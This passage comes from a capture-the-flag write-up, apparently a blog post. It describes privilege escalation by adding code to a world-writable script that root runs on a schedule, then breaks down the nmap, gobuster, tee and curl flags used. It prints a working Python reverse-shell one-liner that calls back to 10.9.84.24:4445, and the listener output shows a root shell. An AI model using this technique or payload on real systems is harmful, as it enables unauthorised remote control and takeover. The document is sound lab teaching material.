www-data@ubuntu-xenial:/home/d4rckh$ ls -la                                          
total 16                                          
drwxr-xr-x 2 d4rckh d4rckh 4096 Jul  5 21:35 .
drwxr-xr-x 5 root   root   4096 Jul  5 21:45 ..
-rwxrwxrwx 1 root   root    129 Jul  5 21:45 cleanup.py
-rw-r--r-- 1 d4rckh d4rckh   33 Jul  5 21:45 user.txt&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;Feeling never gets old :‘) &lt;/p&gt;
&lt;p&gt;This was enough to get user flag as you can see. Next, we move to privilege escalation. &lt;/p&gt;
&lt;h3&gt;Privesc + root flag&lt;/h3&gt;
&lt;p&gt;If you paid close attention to what was shown above, you noticed that along with the &lt;strong&gt;user.txt&lt;/strong&gt;,
there’s was &lt;strong&gt;cleanup.py&lt;/strong&gt; script. You can tell it was originally created by the root but for whatever reason
we have all the permissions (read, write and execution). A quick &lt;code class=&quot;language-text&quot;&gt;cat&lt;/code&gt; to reveal its content:&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;text&quot;&gt;&lt;pre class=&quot;language-text&quot;&gt;&lt;code class=&quot;language-text&quot;&gt;www-data@ubuntu-xenial:/home/d4rckh$ cat cleanup.py                                                 
#!/usr/bin/env python                                                                               
                                                                                                    
import os                                                                                           
import sys
                                                                                          
try:                                                                                                
        os.system(&amp;#39;rm -r /home/cleanup/* &amp;#39;)                                                         
except:                                                                                             
        sys.exit()                      &lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;It seemed to me - and I guess this comes with a little bit of practice - like it was job (the kind of file that runs from time to time). I didn’t even check the cron jobs to see if there was something and just went with my gut. I then placed this piece of code I took from &lt;a href=&quot;http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet&quot;&gt;here&lt;/a&gt; on the top the script:&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;text&quot;&gt;&lt;pre class=&quot;language-text&quot;&gt;&lt;code class=&quot;language-text&quot;&gt;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&amp;quot;10.9.84.24&amp;quot;,4445));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([&amp;quot;/bi
n/sh&amp;quot;,&amp;quot;-i&amp;quot;]);   &lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;and again, waited (this time listening to the port &lt;strong&gt;4445&lt;/strong&gt; however). After a minute or two(?):&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;text&quot;&gt;&lt;pre class=&quot;language-text&quot;&gt;&lt;code class=&quot;language-text&quot;&gt;$ nc -vlp 4445
$ id                                
id=0(root) gid=0(root) groups=0(root)
$ ls 
root.txt&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;Game over. Put on &lt;a href=&quot;https://www.youtube.com/watch?v=r4b6XKk5-oo&quot;&gt;Privilege escalation&lt;/a&gt; on by Com Truise and go celebrate. I sure did. :)&lt;/p&gt;
&lt;p&gt;That’s it. Hope you’ve learnt something from this. See y’all next time.&lt;/p&gt;
&lt;h3&gt;Command breakdown&lt;/h3&gt;
&lt;h4&gt;Nmap&lt;/h4&gt;
&lt;blockquote&gt;
&lt;p&gt;Nmap is free security scanner, port scanner &amp;#x26; network exploration tool.&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h5&gt;First usage:&lt;/h5&gt;
&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;-sC&lt;/strong&gt;: This options lets you take advantage of the vast scripts that are part of the the &lt;em&gt;nmap&lt;/em&gt; ecosystem. We will dive into that in a future tutorial.&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;-sV&lt;/strong&gt;: This allows me to know the different version which port is currently running. The absence of this, for instance, would just display that &lt;strong&gt;ftp&lt;/strong&gt; is running in the port 23 without telling you its &lt;strong&gt;vsftpd 3.0.3&lt;/strong&gt;.&lt;/li&gt;
&lt;/ul&gt;
&lt;h5&gt;Second usage:&lt;/h5&gt;
&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;-Pn&lt;/strong&gt;: Assumes that the host being scanned is up, skipping the verification.&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;-p-&lt;/strong&gt;: Scan all 65535 ports.&lt;/li&gt;
&lt;/ul&gt;
&lt;h4&gt;Tee&lt;/h4&gt;
&lt;blockquote&gt;
&lt;p&gt;Tee allows you to read something from the standard input and outputs it standard output.&lt;/p&gt;
&lt;/blockquote&gt;
&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;-a&lt;/strong&gt;: With the addition of this option, it allows you to append the output to a file - nmap-report in this case - which can be used for later reference. &lt;/li&gt;
&lt;/ul&gt;
&lt;h4&gt;Gobuster&lt;/h4&gt;
&lt;blockquote&gt;
&lt;p&gt;Gobuster is a tool used to brute-force URIs, DNS and Virtual Hosts.&lt;/p&gt;
&lt;/blockquote&gt;
&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;dir&lt;/strong&gt;: Tells gobuster we are scanning directories.&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;-u&lt;/strong&gt;: Current hosted being scanned.&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;-w&lt;/strong&gt;: Wordlist path being used.&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;-t&lt;/strong&gt;: Number of threads we are using. &lt;/li&gt;
&lt;/ul&gt;
&lt;h4&gt;cURL&lt;/h4&gt;
&lt;blockquote&gt;
&lt;p&gt;a HTTP client.&lt;/p&gt;
&lt;/blockquote&gt;
&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;-s&lt;/strong&gt;: Silent mode or do not show progress while retrieving data.&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;-i&lt;/strong&gt;: Show headers as part of the response. &lt;/li&gt;
&lt;/ul&gt;</content:encoded></item></channel></rss>